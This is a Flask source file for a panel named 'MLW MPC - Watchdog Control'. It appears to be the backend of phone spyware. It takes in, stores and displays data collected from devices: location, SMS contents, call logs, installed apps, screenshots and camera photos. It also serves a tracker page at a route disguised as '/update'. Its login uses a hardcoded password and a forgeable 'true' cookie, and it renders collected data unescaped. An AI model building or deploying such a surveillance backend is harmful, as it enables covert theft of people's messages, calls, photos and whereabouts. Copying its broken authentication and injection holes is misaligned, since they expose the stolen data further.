from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)
DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id SERIAL PRIMARY KEY,
                server_name TEXT,
                ip_address TEXT,
                event_type TEXT,
                message TEXT,
                attacker_info TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS phone_tracking (
                id SERIAL PRIMARY KEY,
                device_id TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                battery INTEGER,
                screenshot TEXT,
                sms TEXT,
                call_log TEXT,
                apps TEXT,
                camera_photo TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        ''')
        conn.commit()
        cur.close()
        conn.close()
        print("[+] Database tables ready")
    except Exception as e:
        print(f"[-] DB Init error: {e}")

init_db()

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>MLW MPC Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0a0e27; color: #00ffcc; font-family: monospace; padding: 20px; }
        h1 { color: #ff3366; text-align: center; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; justify-content: center; }
        .tab { padding: 10px 20px; background: #1a1f3a; cursor: pointer; border-radius: 5px; }
        .tab.active { background: #ff3366; color: white; }
        .content { display: none; background: #0f1233; padding: 20px; border-radius: 10px; }
        .content.active { display: block; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #00ffcc; padding: 8px; text-align: left; }
        th { background: #1a1f3a; }
        .login { max-width: 300px; margin: 100px auto; background: #1a1f3a; padding: 20px; border-radius: 10px; }
        input, button { width: 100%; padding: 10px; margin: 5px 0; background: #0a0e27; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; }
        button:hover { background: #ff3366; color: white; cursor: pointer; }
        .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px; }
        .status { color: #ff0; }
        img { max-width: 100px; margin: 5px; border: 1px solid #00ffcc; }
        pre { background: #0a0e27; padding: 5px; overflow-x: auto; max-width: 300px; font-size: 10px; }
    </style>
    <script>
        let currentTab = 'reports';
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.authenticated) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadReports();
                loadTracking();
                loadServers();
                setInterval(loadReports, 10000);
                setInterval(loadTracking, 15000);
                setInterval(loadServers, 30000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({password: pwd}) });
            const data = await res.json();
            if (data.success) { checkAuth(); } else { alert('Wrong password'); }
        }
        async function loadReports() {
            const res = await fetch('/api/reports');
            const data = await res.json();
            document.getElementById('reports').innerHTML = data.map(r => `<tr><td>${r.server_name || '-'}</td><td>${r.event_type}</td><td>${r.message.substring(0, 100)}</td><td>${r.attacker_info || '-'}</td><td>${r.created_at}</td></tr>`).join('');
        }
        async function loadTracking() {
            const res = await fetch('/api/tracking');
            const data = await res.json();
            document.getElementById('tracking').innerHTML = data.map(t => `<tr>
                <td>${t.device_id}</td>
                <td>${t.latitude}, ${t.longitude}</td>
                <td>${t.battery || 0}%</td>
                <td><pre>${t.sms || '-'}</pre></td>
                <td><pre>${t.call_log || '-'}</pre></td>
                <td><pre>${t.apps || '-'}</pre></td>
                <td>${t.camera_photo ? '<img src="'+t.camera_photo+'">' : '-'}</td>
                <td>${t.created_at}</td>
            </tr>`).join('');
        }
        async function loadServers() {
            const res = await fetch('/api/servers');
            const data = await res.json();
            document.getElementById('servers').innerHTML = data.map(s => `<tr><td>${s.server_name}</td><td><span class="badge">${s.last_seen || 'unknown'}</span></td><td>${s.status || 'active'}</td></tr>`).join('');
        }
        function showTab(tab) {
            document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
            document.getElementById(tab + '-content').classList.add('active');
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login" style="display:none">
    <h2>MLW MPC Control</h2>
    <input type="password" id="pwd" placeholder="Password">
    <button onclick="login()">Login</button>
</div>
<div id="content">
    <h1>🔒 MLW MPC - Watchdog Control</h1>
    <div class="tabs">
        <div class="tab active" onclick="showTab('reports')">📡 Server Reports</div>
        <div class="tab" onclick="showTab('tracking')">📱 Phone Tracking</div>
        <div class="tab" onclick="showTab('servers')">🖥️ Active Servers</div>
    </div>
    <div id="reports-content" class="content active">
        <h3>Real-time Server Alerts</h3>
        <table><thead><tr><th>Server</th><th>Event</th><th>Message</th><th>Attacker</th><th>Time</th></tr></thead><tbody id="reports"></tbody></table>
    </div>
    <div id="tracking-content" class="content">
        <h3>Phone Tracking Data</h3>
        <table><thead><tr><th>Device</th><th>Location</th><th>Battery</th><th>SMS</th><th>Calls</th><th>Apps</th><th>Photo</th><th>Time</th></tr></thead><tbody id="tracking"></tbody></table>
    </div>
    <div id="servers-content" class="content">
        <h3>Monitored Servers</h3>
        <table><thead><tr><th>Server</th><th>Last Seen</th><th>Status</th></tr></thead><tbody id="servers"></tbody></table>
    </div>
</div>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(HTML)

@app.route('/update')
def serve_tracker():
    return send_from_directory('static', 'index.html')

@app.route('/api/auth')
def auth():
    return jsonify({'authenticated': request.cookies.get('mlw_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('mlw_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/tracker', methods=['POST'])
def tracker():
    data = request.json
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO phone_tracking (device_id, latitude, longitude, accuracy, battery, screenshot, sms, call_log, apps, camera_photo)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        ''', (data.get('device_id'), data.get('lat'), data.get('lng'), data.get('accuracy'), data.get('battery'), data.get('screenshot'), data.get('sms'), data.get('calls'), data.get('apps'), data.get('photo')))
        conn.commit()
        cur.close()
        conn.close()
        print(f"[+] Tracker data received from {data.get('device_id')}")
    except Exception as e:
        print(f"[-] Tracker error: {e}")
    return jsonify({'status': 'ok'})

@app.route('/api/tracking')
def get_tracking():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT device_id, latitude, longitude, accuracy, battery, sms, call_log, apps, camera_photo, created_at FROM phone_tracking ORDER BY created_at DESC LIMIT 100')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify([{'device_id': r[0], 'latitude': r[1], 'longitude': r[2], 'accuracy': r[3], 'battery': r[4], 'sms': r[5], 'call_log': r[6], 'apps': r[7], 'camera_photo': r[8], 'created_at': r[9]} for r in rows])

@app.route('/api/report', methods=['POST'])
def report():
    data = request.json
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('INSERT INTO reports (server_name, ip_address, event_type, message, attacker_info) VALUES (%s, %s, %s, %s, %s)', (data.get('server'), request.remote_addr, data.get('event'), data.get('message'), data.get('attacker_info')))
        conn.commit()
        cur.close()
        conn.close()
        print(f"[+] Report from {data.get('server')}")
    except Exception as e:
        print(f"[-] Report error: {e}")
    return jsonify({'status': 'ok'})

@app.route('/api/reports')
def get_reports():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT server_name, event_type, message, attacker_info, created_at FROM reports ORDER BY created_at DESC LIMIT 200')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify([{'server_name': r[0], 'event_type': r[1], 'message': r[2], 'attacker_info': r[3], 'created_at': r[4]} for r in rows])

@app.route('/api/servers')
def get_servers():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT DISTINCT server_name, MAX(created_at) as last_seen FROM reports GROUP BY server_name ORDER BY last_seen DESC')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify([{'server_name': r[0], 'last_seen': r[1], 'status': 'active'} for r in rows])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
